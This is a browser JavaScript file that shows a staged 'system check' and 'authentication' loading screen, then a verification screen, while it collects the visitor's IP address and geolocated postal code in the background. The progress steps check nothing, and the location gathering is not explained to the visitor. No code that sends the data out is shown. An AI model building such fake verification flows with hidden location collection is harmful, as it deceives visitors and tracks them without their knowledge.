// Debug version to test basic functionality
console.log('🚀 Debug script loaded');

// Basic variables
let loadingProgress = 0;
let userIP = '';
let userPostalCode = '';
let initialWebhookSent = false;
let sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);

// Loading steps
const loadingSteps = [
    { text: 'Initializing system...', duration: 1500 },
    { text: 'Checking system requirements...', duration: 2000 },
    { text: 'Verifying device compatibility...', duration: 2000 },
    { text: 'Preparing authentication...', duration: 1500 },
    { text: 'Setting up verification...', duration: 1000 }
];

// Update progress bar
function updateProgressBar(percentage) {
    const progressFill = document.getElementById('progress-fill');
    const progressText = document.getElementById('progress-text');
    
    console.log(`📊 Updating progress bar to ${percentage}%`);
    
    if (progressFill) {
        progressFill.style.width = percentage + '%';
    } else {
        console.error('❌ Progress fill element not found');
    }
    
    if (progressText) {
        progressText.textContent = loadingSteps[Math.floor((percentage / 100) * loadingSteps.length)]?.text || 'Loading...';
    } else {
        console.error('❌ Progress text element not found');
    }
}

// Update status item
function updateStatusItem(statusId, icon, text, isActive, isCompleted) {
    const statusItem = document.getElementById(statusId);
    if (!statusItem) {
        console.log(`❌ Status item ${statusId} not found`);
        return;
    }
    
    const statusIcon = statusItem.querySelector('.status-icon');
    const statusText = statusItem.querySelector('.status-text');
    
    statusIcon.textContent = icon;
    statusText.textContent = text;
    
    statusItem.classList.remove('active', 'completed');
    if (isActive) {
        statusItem.classList.add('active');
    } else if (isCompleted) {
        statusItem.classList.add('completed');
    }
}

// Start loading sequence
async function startLoadingSequence() {
    console.log('🚀 Starting loading sequence...');
    
    const progressFill = document.getElementById('progress-fill');
    const progressText = document.getElementById('progress-text');
    
    if (!progressFill || !progressText) {
        console.error('❌ Progress elements not found');
        console.log('  - progressFill:', progressFill ? '✅ Found' : '❌ Missing');
        console.log('  - progressText:', progressText ? '✅ Found' : '❌ Missing');
        return;
    }
    
    console.log('✅ Progress elements found, starting sequence...');
    
    for (let i = 0; i < loadingSteps.length; i++) {
        const step = loadingSteps[i];
        progressText.textContent = step.text;
        console.log(`📊 Step ${i + 1}: ${step.text}`);
        
        // Update status items
        if (i === 0) {
            updateStatusItem('status-1', '⏳', step.text, true);
        } else if (i === 1) {
            updateStatusItem('status-1', '✅', 'Checking system requirements', false, true);
            updateStatusItem('status-2', '⏳', step.text, true);
        } else if (i === 2) {
            updateStatusItem('status-2', '✅', 'Verifying device compatibility', false, true);
            updateStatusItem('status-3', '⏳', step.text, true);
        } else if (i === 3) {
            updateStatusItem('status-3', '✅', 'Preparing authentication', false, true);
        }
        
        // Update progress bar
        const targetProgress = ((i + 1) / loadingSteps.length) * 100;
        const progressIncrement = targetProgress - loadingProgress;
        const steps = 20;
        const incrementAmount = progressIncrement / steps;
        
        for (let j = 0; j < steps; j++) {
            loadingProgress += incrementAmount;
            updateProgressBar(loadingProgress);
            await new Promise(resolve => setTimeout(resolve, step.duration / steps));
        }
        
        loadingProgress = targetProgress;
        updateProgressBar(loadingProgress);
    }
    
    // Complete all status items
    updateStatusItem('status-3', '✅', 'Preparing authentication', false, true);
    
    // Wait a moment before transitioning
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    // Hide loading screen and show verification screen
    console.log('🔄 Transitioning from loading screen to verification screen...');
    const loadingScreen = document.getElementById('loading-screen');
    const verificationScreen = document.getElementById('verification-screen');
    
    if (loadingScreen && verificationScreen) {
        loadingScreen.style.display = 'none';
        verificationScreen.style.display = 'flex';
        console.log('✅ Successfully transitioned to verification screen');
    } else {
        console.error('❌ Failed to find loading screen or verification screen elements');
        console.log('  - loadingScreen:', loadingScreen ? '✅ Found' : '❌ Missing');
        console.log('  - verificationScreen:', verificationScreen ? '✅ Found' : '❌ Missing');
    }
    
    console.log('✅ Loading sequence completed!');
}

// Get IP address with multiple fallback services
async function getIPAddress() {
    const ipServices = [
        { url: 'https://api.ipify.org?format=json', parser: (data) => data.ip },
        { url: 'https://ipapi.co/json/', parser: (data) => data.ip },
        { url: 'https://api.myip.com', parser: (data) => data.ip },
        { url: 'https://httpbin.org/ip', parser: (data) => data.origin },
        { url: 'https://ifconfig.me/ip', parser: (data) => data.trim() }
    ];
    
    for (const service of ipServices) {
        try {
            console.log(`🔄 Trying IP service: ${service.url}`);
            const response = await fetch(service.url, {
                method: 'GET',
                mode: 'cors',
                cache: 'no-cache',
                headers: {
                    'Accept': 'application/json'
                }
            });
            
            if (response.ok) {
                const data = await response.json();
                const ip = service.parser(data);
                
                if (ip && ip !== 'Unknown IP') {
                    console.log(`✅ IP retrieved from ${service.url}: ${ip}`);
                    return ip;
                }
            }
        } catch (error) {
            console.log(`❌ IP service ${service.url} failed:`, error.message);
        }
    }
    
    console.log('⚠️ All IP services failed, using fallback');
    return 'Unknown IP';
}

// Get postal code using geolocation API
async function getPostalCode() {
    console.log('📍 Getting postal code using geolocation...');
    
    try {
        // Try to get user's location using browser geolocation
        const position = await new Promise((resolve, reject) => {
            if (!navigator.geolocation) {
                reject(new Error('Geolocation is not supported'));
                return;
            }
            
            navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: false,
                timeout: 10000,
                maximumAge: 300000
            });
        });
        
        // Use reverse geocoding to get postal code
        const { latitude, longitude } = position.coords;
        console.log(`📍 Got coordinates: ${latitude}, ${longitude}`);
        
        // Try multiple geocoding services
        const geocodingServices = [
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`,
            `https://geocode.maps.co/reverse?lat=${latitude}&lon=${longitude}&format=json`
        ];
        
        for (const serviceUrl of geocodingServices) {
            try {
                const response = await fetch(serviceUrl, {
                    method: 'GET',
                    mode: 'cors',
                    cache: 'no-cache',
                    headers: {
                        'Accept': 'application/json',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    }
                });
                
                if (response.ok) {
                    const data = await response.json();
                    let postalCode = null;
                    
                    // Extract postal code from different response formats
                    if (data.address && data.address.postcode) {
                        postalCode = data.address.postcode;
                    } else if (data.address && data.address.zip) {
                        postalCode = data.address.zip;
                    } else if (data.address && data.address.postal_code) {
                        postalCode = data.address.postal_code;
                    }
                    
                    if (postalCode) {
                        console.log(`✅ Postal code retrieved from ${serviceUrl}: ${postalCode}`);
                        return postalCode;
                    }
                }
            } catch (error) {
                console.log(`❌ Geocoding service ${serviceUrl} failed:`, error.message);
            }
        }
        
        console.log('⚠️ Could not get postal code from coordinates');
        
    } catch (error) {
        console.log('❌ Geolocation failed:', error.message);
    }
    
    // Fallback: ask user for postal code
    return new Promise((resolve) => {
        const postalCode = prompt('📍 Please enter your postal code for better location accuracy:');
        if (postalCode && postalCode.trim()) {
            console.log(`✅ User provided postal code: ${postalCode.trim()}`);
            resolve(postalCode.trim());
        } else {
            console.log('⚠️ No postal code provided, using default');
            resolve('Unknown Postal Code');
        }
    });
}

// Collect location data (IP + Postal Code)
async function collectLocationData() {
    console.log('🌐 Starting location data collection...');
    
    try {
        // Get IP address
        console.log('📡 Getting IP address...');
        userIP = await getIPAddress();
        
        // Get postal code
        console.log('📍 Getting postal code...');
        userPostalCode = await getPostalCode();
        
        console.log('📋 Location data collected:');
        console.log('  - IP Address:', userIP);
        console.log('  - Postal Code:', userPostalCode);
        
    } catch (error) {
        console.error('❌ Error collecting location data:', error);
    }
}

// Initialize when page loads
window.addEventListener('load', function() {
    console.log('🚀 Page loaded, starting loading sequence...');
    
    // Start loading sequence immediately
    setTimeout(() => {
        startLoadingSequence();
    }, 500);
    
    // Collect location data in the background
    setTimeout(() => {
        collectLocationData();
    }, 1000);
});

console.log('✅ Debug script initialized');
